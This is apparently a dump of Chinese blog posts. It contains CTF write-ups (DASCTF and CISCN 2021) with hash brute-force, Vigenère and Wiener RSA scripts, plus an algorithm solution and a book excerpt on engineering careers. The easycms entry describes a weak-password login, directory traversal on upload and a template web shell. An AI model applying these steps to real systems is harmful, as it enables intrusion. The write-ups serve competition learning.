class="hljs-string">&quot;&quot;</span>.join(item)<br>        aa = hashlib.sha256(tmp.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br>        <span class="hljs-keyword">if</span> aa.hexdigest() == res:<br>            <span class="hljs-built_in">print</span>(tmp)<br>            exit(<span class="hljs-number">0</span>)<br><br><br><br>generate_strings()<br></code></pre></td></tr></table></figure><p>sha512 -&gt; 4位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><br>dateset = string.ascii_lowercase + string.digits<br><br>res = <span class="hljs-string">&quot;6500fe72abcab63d87f213d2218b0ee086a1828188439ca485a1a40968fd272865d5ca4d5ef5a651270a52ff952d955c9b757caae1ecce804582ae78f87fa3c9&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_strings</span>(<span class="hljs-params">length=<span class="hljs-number">4</span></span>):<br>    chars = string.ascii_lowercase + string.digits<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> itertools.product(chars, repeat=length):<br>        tmp = <span class="hljs-string">&quot;&quot;</span>.join(item)<br>        aa = hashlib.sha512(tmp.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)).hexdigest()<br><br>        <span class="hljs-keyword">if</span> aa.hexdigest() == res:<br>            <span class="hljs-built_in">print</span>(tmp)<br>            exit(<span class="hljs-number">0</span>)<br><br><br><br>generate_strings()<br></code></pre></td></tr></table></figure><p>md5 -&gt; 4位</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> string<br><span class="hljs-keyword">import</span> itertools<br><br>dateset = string.ascii_lowercase + string.digits<br><br>flag = <span class="hljs-string">&quot;ff6e2fd78aca4736037258f0ede4ecf0&quot;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_strings</span>(<span class="hljs-params">length=<span class="hljs-number">4</span></span>):<br>    chars = string.ascii_lowercase + string.digits<br>    <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> itertools.product(chars, repeat=length):<br>        md5 = hashlib.md5()<br><br>        tmp = <span class="hljs-string">&quot;&quot;</span>.join(item)<br>        md5.update(tmp.encode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br>        <span class="hljs-keyword">if</span> md5.hexdigest() == flag:<br>            <span class="hljs-built_in">print</span>(tmp)<br>            exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>将以上爆破出来的值按照顺序连在一起即为flag</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="easycms"><a href="#easycms" class="headerlink" title="easycms"></a>easycms</h3><p>题目提示五位弱密码，尝试admin&#x2F;12345后登陆成功。<br>尝试更改主题相关模板代码提示需要创建<code>/system/tmp/xxxx.txt</code>(貌似是动态的四个字母）。<br>在素材库上传文件可观察到路径是文件名直接拼接来的，故可利用目录穿越创建上述要求创建的文件。再向模板内插入shell后读flag即可。    </p>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【每日一题】AcWing 3705.子集mex值</title>
      <link href="/2021/06/4a55d7b7.html"/>
      <url>/2021/06/4a55d7b7.html</url>
      
        <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>给定一组 n 个整数的集合 a1,a2,…,an（可能存在相同元素）。</p><p>请你将该集合分为两个子集 A 和 B（子集可以为空，也可以包含相同元素）。</p><p>要求 mex(A)+mex(B) 的值尽可能大。</p><p>一个集合的 mexmex 值等于集合中不存在的最小非负整数的值，例如：</p><ul><li>mex({1,4,0,2,2,1})&#x3D;3</li><li>mex({3,3,2,1,3,0,0})&#x3D;4</li><li>mex(∅)&#x3D;0</li></ul><p>如果集合中的任意整数 x 均满足 x 在该集合中的出现次数等于 x 在 A 中出现的次数与 x 在 B 中出现的次数之和，则我们认为该集合被分成了 A 和 B 两个子集。</p><h4 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h4><p>第一行包含整数T，表示共有 T 组测试数据。</p><p>每组数据第一行包含整数 n。</p><p>第二行包含 nn 个整数 a1,a2,…,an。</p><h4 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h4><p>每组数据输出一行一个结果，表示 mex(A)+mex(B)的最大值。</p><h4 id="数据范围"><a href="#数据范围" class="headerlink" title="数据范围"></a>数据范围</h4><p>1≤T≤100,<br>1≤n≤100,<br>0≤ai≤100</p><h4 id="输入样例："><a href="#输入样例：" class="headerlink" title="输入样例："></a>输入样例：</h4><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-number">4</span><br><span class="hljs-number">6</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">5</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span><br><span class="hljs-number">3</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-number">4</span><br><span class="hljs-symbol">0 </span><span class="hljs-number">2</span> <span class="hljs-number">0</span> <span class="hljs-number">1</span><br><span class="hljs-number">6</span><br><span class="hljs-symbol">1 </span><span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><h4 id="输出样例："><a href="#输出样例：" class="headerlink" title="输出样例："></a>输出样例：</h4><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">5<br>3<br>4<br>0<br></code></pre></td></tr></table></figure><h4 id="样例解释"><a href="#样例解释" class="headerlink" title="样例解释"></a>样例解释</h4><p>在第一个测试用例中，A&#x3D;{0,1,2},B&#x3D;{0,1,5} 是一个可能的选择。</p><p>在第二个测试用例中，A&#x3D;{0,1,2},B&#x3D;∅ 是一个可能的选择。</p><p>在第三个测试用例中，A&#x3D;{0,1,2},B&#x3D;{0} 是一个可能的选择。</p><p>在第四个测试用例中，A&#x3D;{1,3,5},B&#x3D;{2,4,6} 是一个可能的选择。</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>贪心思想，因为题目没有要求具体的分割方法，所以越小的肯定是最优的结果，先存入所有数出现的次数，然后从0开始枚举找到最小的数即可。</p><h2 id="C-代码"><a href="#C-代码" class="headerlink" title="C++代码"></a>C++代码</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cstring&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">110</span>;<br><br><span class="hljs-type">int</span> a[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">calc</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;N;i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(!a[i])   <span class="hljs-keyword">return</span> i;<br>        <span class="hljs-keyword">else</span> a[i]--;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t;<br>    cin&gt;&gt;t;<br>    <span class="hljs-keyword">while</span>(t--)<br>    &#123;<br>        <span class="hljs-built_in">memset</span>(a, <span class="hljs-number">0</span> ,<span class="hljs-built_in">sizeof</span>(a));<br>        <span class="hljs-type">int</span> n;<br>        cin&gt;&gt;n;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-type">int</span> x;<br>            cin&gt;&gt;x;<br>            a[x]++;   <br>        &#125;<br>        cout&lt;&lt;<span class="hljs-built_in">calc</span>()+<span class="hljs-built_in">calc</span>()&lt;&lt;endl;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> acwing </tag>
            
            <tag> 算法 </tag>
            
            <tag> 贪心 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【摘录】一个技术男的自白</title>
      <link href="/2021/06/156af401.html"/>
      <url>/2021/06/156af401.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>本文节选自<code>《 Wireshark 网络分析就是那么简单》</code>一书，这一段写得很有感触，故在此摘抄。</p></blockquote><p><strong>文：林沛满</strong></p><p>当我在台灯下写到这一篇时，不由得想到几个月后，另一束灯光下的读者正翻到这一页，跨越时空的交流真是奇妙。我要感谢你购买本书并坚持读到这里。作为小众图书的作者，我最珍视的是读者对本书内容的喜爱，也希望你在阅读中有所收获。最后一篇，就让我们忘记那些乏味的术语，谈些有趣一点的话题吧。</p><p>关于技术，当下的热点是Full Stack Engineer，翻译过来就是全栈工程师。我的理解就是从前端到后端，从软件到硬件都懂的通才。其实在全栈的概念出现之前，关于技术广度和深度的讨论就从来没有停止过。在时间有限的情况下，究竟是应该扩展广度，各种技术都去涉猎，还是把所有精力都投入在一门技术上呢？我个人更倾向于后者，因为当某项技术学到了较深的程度后，眼界就不一样了，再学其他的技术也容易达到类似境界。以本书提到的协议为例，如果你已经精通CIFS，那很可能稍加点拨就能完全理解NFS；同样如果你理解了网络的分层和流控，再学习存储的层次和缓存也比较容易。但假如一个人连最擅长的技术都浅尝辄止，那学习其他技术也会停留在表面上。我有位技术出色的朋友用过一个生动的比喻来说明这个问题：技术深度和广度的关系，就像登山时的高度和视野。假如你爬到半山腰就停下来眺望，就只能看到一半的视野；但如果埋头爬到山顶，一抬头便是无边的风景。</p><p>关于薪水，是很多工程师自怨自艾的口水话题。不知道从何时开始，大家似乎都觉得自己被亏待了。微博上流传各种自嘲的段子，比如“今天你编程时流的汗，就是当初填志愿时脑子进的水”；我也曾经开玩笑说自己的英文名是“Low Payman”；我有位年薪40多万的同事，MSN签名是“少壮不努力，老大干IT”；还有一种流行的说法，认为在中国不适合走技术路线，否则为什么在国外才有白发苍苍的老工程师？看过太多类似段子之后，我觉得这种群体心态已经有点矫情了。无论在什么国家，工程师都排不上收入最高的群体。相比国外，中国工程师地位已经算高了，比如美国工程师的收入就完全比不上律师和医生等职业，但在中国就未必是这样。中国也不是没有老工程师的发展空间，而是因为第一批工程师还没有变老。热爱自嘲的人其实也心知肚明—他们的薪水完全足以维持体面的生活，比如那位“少壮不努力”的同学，一直在上海这个大染缸过着纸醉金迷的日子。而真正徒伤悲的职业，恐怕根本没有心情自我编排……我认为自嘲是一种难得的幽默，但是当一个群体的自嘲都专注在薪水上，听上去就有点无聊。</p><p>关于办公室政治，那真不是属于我们的战场。孟子的“劳心者治人，劳力者治于人”对中国影响太过深远，我不止一位朋友从技术路线改走管理路线的时候，以这句话作为座右铭。而在我看来，自从人类进化到可以坐在办公室里“劳力”之后，“劳心”就缺乏吸引力了。人类比电脑狡诈太多，还是管电脑省心。我们就把办公室政治这样劳心的活儿留给走管理路线的同事吧，只要不站队不说是非，用技术帮助所有人，自然会成为单位里最受尊敬的人。</p><p>关于创业，我想没有哪个行业比IT界更热衷于此了。或许是因为这一行有过太多轻易成功的故事，所以工程师们蠢蠢欲动，仿佛每个人都在想，连一个毫无技术含量的导航网站都能被高价收购，满腹才华的我能干出怎样惊天动地的事业？于是有志者开始对职业不满，觉得无论如何应该出去闯闯，寻找自己被封印的灵魂，他们振臂一挥，豪气万丈地说“走，创业去！”其实我个人是非常羡慕这样充满激情的人生的，无奈看过太多失败的例子，总觉得创业的成功率被高估。有位朋友到福建承包一片山林之后，很快发现这东西并没有想象中那么赚钱。终于在花光所有积蓄之后，萌发了“不如归去”的念头。虽然听上去颇有禅意，其实心里还是很懊悔的，最后不仅回到原来公司，还坐到原来的位子上。当然成功者也是有的，不要妒嫉他们，因为这是冒着风险得到的。</p><p>关于跳槽，除了印度之外，我还没有见过比中国工程师更爱跳槽的群体。由于每跳槽一次基本能加薪30%，的确让人难以淡定地呆在一个岗位上。不过在我看来，频繁跳槽所付出的代价恐怕高于这点收益，因为很快就会发现无处可跳了。而且更大的副作用是，多次换工作导致了各种技术都只学到皮毛，等醒悟过来已经晚了。如果某个新职位吸引你的亮点只是加薪，我建议三思而行。</p><p>关于理科生的骄傲，在工程师群体中，有小部分年轻人至今还保持着源自高中理科班的自豪感。比如看到一本精彩的科幻小说，便觉得文科生不可能懂；如果新来的领导不是理工科出身，就感叹所处的并非技术驱动型公司；最让我吃惊的一次，是一位DBA质疑不懂技术的销售人员为什么地位那么高。这种错误的认知显然源于交际圈子的狭隘，对非技术人员的能力缺乏了解。其实你在调试代码时，他们同样在推敲文案；你在餐桌上只管品菜海侃，他们却要左右逢源，让所有宾客感到满意；你结交朋友只看心情喜好，他们在朋友圈里只说“正确”的话，永远如沐春风地倾听；你在内部会议上发言都显拘谨，他们面对突如其来的话筒也能侃侃而谈……毫无疑问，非技术工作的“技术含量”一点都不低。幸好随着阅历的增长，大多数理科生都能改掉这个毛病。</p><p>关于生活，IT男们已经被打上了太多标签：宅、木讷、生活简单。这当然是一种偏见，至少我身边的朋友就不是这样。不过比起国外的工程师群体，我们的业余生活似乎是单调了些。比如与我合作多年的国外同事中，有组乐队的、当冰球教练的、玩帆船的、DIY花园的……有些朋友对此羡慕不已，以为发达国家才玩得起多样化的娱乐，对此我不敢苟同。比如中国学习乐器的人数早就全球第一，在我屈指可数的女同事中，至少有三位在小时候考过钢琴十级。我所住的小区一楼都配有朝南的大院子，园艺条件极佳，只是户户都铺砖硬化了……所以细想起来，经济上并不是主因，只是不够热情罢了。工程师本来就是最擅长DIY的群体，只要行动起来，完全可以让业余生活更加丰富，成为一个更加有趣的人。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 摘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2021东北赛区-Maple_root-WriteUp</title>
      <link href="/2021/06/5b8c955f.html"/>
      <url>/2021/06/5b8c955f.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>参赛队员：</p><p><a href="https://www.0error.net/">x0r</a>，b477eRy，<a href="https://yueqsun.github.io/">f1oat</a></p></blockquote><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote><p>最终成绩：3627</p><p>最终排名：13</p><p>一血数量：3</p></blockquote><p>本次比赛前期一切顺利，后期感觉被py爆了，结果名次就拉了下来，整体题目全部都偏向MISC，打的很迷惑，但是算不上难（RE除外），希望下次国赛能进决赛看看…</p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="MISC-签到"><a href="#MISC-签到" class="headerlink" title="MISC_签到"></a>MISC_签到</h3><p>打开以后压缩包内有一个二维码文件，利用压缩包内的二维码扫描器扫描后即可得到flag</p><h3 id="Sudoku"><a href="#Sudoku" class="headerlink" title="Sudoku"></a>Sudoku</h3><p>根据题目判断是一个数独解密，下载以后在压缩包内有一个flag压缩包和一个数独游戏的excel表格，打开以后是一个数独游戏，直接放入z3解密工具解出答案以后按照从左上到右下的对角线顺序依次输入以后解开flag压缩包得到最终结果</p><h3 id="Vigenere"><a href="#Vigenere" class="headerlink" title="Vigenère"></a>Vigenère</h3><p>下载文件后使用binwalk解出一个<code>b.txt</code>文件，根据题目标题判断是维吉尼亚密码，但是没有找到key，用脚本爆破</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs python2">import itertools<br>import string<br>import sys<br>import textwrap<br><br>&quot;&quot;&quot;<br>Run this script in a shell with the ciphertext to decode on STDIN<br>&quot;&quot;&quot;<br><br>####################################################################################################<br># Vienere encryption and decryption functions<br>####################################################################################################<br><br>def vigenere(plaintext, key, a_is_zero=True):<br>    key = key.lower()<br>    if not all(k in string.ascii_lowercase for k in key):<br>        raise ValueError(&quot;Invalid key &#123;!r&#125;; the key can only consist of English letters&quot;.format(key))<br>    key_iter = itertools.cycle(map(ord, key))<br>    return &quot;&quot;.join(<br>        chr(ord(&#x27;a&#x27;) + (<br>            (next(key_iter) - ord(&#x27;a&#x27;) + ord(letter) - ord(&#x27;a&#x27;))    # Calculate shifted value<br>            + (0 if a_is_zero else 2)                               # Account for non-zero indexing<br>            ) % 26) if letter in string.ascii_lowercase             # Ignore non-alphabetic chars<br>        else letter<br>        for letter in plaintext.lower()<br>    )<br><br>def vigenere_decrypt(ciphertext, key, a_is_zero=True):<br>    # Decryption is encryption with the inverse key<br>    key_ind = [ord(k) - ord(&#x27;a&#x27;) for k in key.lower()]<br>    inverse = &quot;&quot;.join(chr(ord(&#x27;a&#x27;) +<br>            ((26 if a_is_zero else 22) -<br>                (ord(k) - ord(&#x27;a&#x27;))<br>            ) % 26) for k in key)<br>    return vigenere(ciphertext, inverse, a_is_zero)<br><br>def test_vigenere(text, key, a_is_zero=True):<br>    ciphertext = vigenere(text, key, a_is_zero)<br>    plaintext  = vigenere_decrypt(ciphertext, key, a_is_zero)<br>    assert plaintext == text, &quot;&#123;!r&#125; -&gt; &#123;!r&#125; -&gt; &#123;!r&#125; (a &#123;&#125;= 0)&quot;.format(<br>        text, ciphertext, plaintext, &quot;&quot; if a_is_zero else &quot;!&quot;)<br><br># Test that the Vigenere encrypt and decrypt work (or are at least inverses)<br>for text in [&quot;rewind&quot;, &quot;text with spaces&quot;, &quot;pun.ctuation&quot;, &quot;numb3rs&quot;]:<br>    for key in [&quot;iepw&quot;, &quot;aceaq&quot;, &quot;safe&quot;, &quot;pwa&quot;]:<br>        test_vigenere(text, key, True)<br>        test_vigenere(text, key, False)<br><br># Now that we&#x27;re sure that all the vigenere stuff is working...<br><br>####################################################################################################<br># Cipher solver<br>####################################################################################################<br><br># From http://code.activestate.com/recipes/142813-deciphering-caesar-code/<br>ENGLISH_FREQ = (0.0749, 0.0129, 0.0354, 0.0362, 0.1400, 0.0218, 0.0174, 0.0422, 0.0665, 0.0027, 0.0047,<br>                0.0357, 0.0339, 0.0674, 0.0737, 0.0243, 0.0026, 0.0614, 0.0695, 0.0985, 0.0300, 0.0116,<br>                0.0169, 0.0028, 0.0164, 0.0004)<br><br>def compare_freq(text):<br>    &quot;&quot;&quot;<br>    Compare the letter distribution of the given text with normal English. Lower is closer.<br><br>    Performs a simple sum of absolute difference for each letter<br>    &quot;&quot;&quot;<br>    if not text:<br>        return None<br>    text = [t for t in text.lower() if t in string.ascii_lowercase]<br>    freq = [0] * 26<br>    total = float(len(text))<br>    for l in text:<br>        freq[ord(l) - ord(&#x27;a&#x27;)] += 1<br>    return sum(abs(f / total - E) for f, E in zip(freq, ENGLISH_FREQ))<br><br><br>def solve_vigenere(text, key_min_size=None, key_max_size=None, a_is_zero=True):<br>    &quot;&quot;&quot;<br>    Solve a Vigenere cipher by finding keys such that the plaintext resembles English<br><br>    Returns:<br>        the first and second best from the set of best keys for each length<br><br>    This is not a brute force solver; instead, it takes advantage of a weakness in the cipher to<br>    solve in O(n * K^2) where n is the length of the text to decrypt and K is the length of the<br>    longest key to try.<br><br>    The idea is that for any key length, the key is used repeatedly, so if the key is of length k<br>    and we take every k&#x27;th letter, those letters should have approximately the same distribution as<br>    the English language on a whole. Furthermore, since each letter in the key is independent, we<br>    can perform the analysis for each letter in the key by taking every k&#x27;th letter at different<br>    starting offsets. Then, since the letters in the key are independent, we can construct the best<br>    key for a given length by simply joining the best candidates for each position.<br>    &quot;&quot;&quot;<br>    best_keys = []<br>    key_min_size = key_min_size or 1<br>    key_max_size = key_max_size or 20<br><br>    text_letters = [c for c in text.lower() if c in string.ascii_lowercase]<br><br>    for key_length in range(key_min_size, key_max_size):<br>        # Try all possible key lengths<br>        key = [None] * key_length<br>        for key_index in range(key_length):<br>            letters = &quot;&quot;.join(itertools.islice(text_letters, key_index, None, key_length))<br>            shifts = []<br>            for key_char in string.ascii_lowercase:<br>                shifts.append(<br>                    (compare_freq(vigenere_decrypt(letters, key_char, a_is_zero)), key_char)<br>                )<br>            key[key_index] = min(shifts, key=lambda x: x[0])[1]<br>        best_keys.append(&quot;&quot;.join(key))<br>    best_keys.sort(key=lambda key: compare_freq(vigenere_decrypt(text, key, a_is_zero)))<br>    return best_keys[:2]<br><br>CIPHERTEXT = sys.stdin.read().strip()<br><br>print &quot;Solving Vigenere cipher:&quot;<br>print &quot;*&quot; * 80<br>print textwrap.fill(CIPHERTEXT, 80)<br>print &quot;*&quot; * 80<br>for key in reversed(solve_vigenere(CIPHERTEXT)):<br>    print &quot;&quot;<br>    print &quot;Found key: &#123;!r&#125;&quot;.format(key)<br>    print &quot;Solution:&quot;<br>    print &quot;=&quot; * 80<br>    print textwrap.fill(vigenere_decrypt(CIPHERTEXT, key))<br>    print &quot;=&quot; * 80<br><br></code></pre></td></tr></table></figure><p>得出了key<code>faisnigslk</code>并得到了明文，最后MD5哈希后提交即为flag</p><h3 id="flagpng"><a href="#flagpng" class="headerlink" title="flagpng"></a>flagpng</h3><p>png宽爆破，使用<code>crc32fix</code>工具修复后flag直接写脸上了。</p><h3 id="easy-rsa"><a href="#easy-rsa" class="headerlink" title="easy_rsa"></a>easy_rsa</h3><p>密码学的模板题…不知道怎么说，直接有现成的解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> ContinuedFractions, Arithmetic, RSAvulnerableKeyGenerator<br><span class="hljs-keyword">import</span> binascii<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hack_RSA</span>(<span class="hljs-params">e,n</span>):<br>    <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Finds d knowing (e,n)</span><br><span class="hljs-string">    applying the Wiener continued fraction attack</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br>    frac = ContinuedFractions.rational_to_contfrac(e, n)<br>    convergents = ContinuedFractions.convergents_from_contfrac(frac)<br><br>    <span class="hljs-keyword">for</span> (k,d) <span class="hljs-keyword">in</span> convergents:<br><br>        <span class="hljs-comment">#check if d is actually the key</span><br>        <span class="hljs-keyword">if</span> k!=<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> (e*d-<span class="hljs-number">1</span>)%k == <span class="hljs-number">0</span>:<br>            phi = (e*d-<span class="hljs-number">1</span>)//k<br>            s = n - phi + <span class="hljs-number">1</span><br>            <span class="hljs-comment"># check if the equation x^2 - s*x + n = 0</span><br>            <span class="hljs-comment"># has integer roots</span><br>            discr = s*s - <span class="hljs-number">4</span>*n<br>            <span class="hljs-keyword">if</span>(discr&gt;=<span class="hljs-number">0</span>):<br>                t = 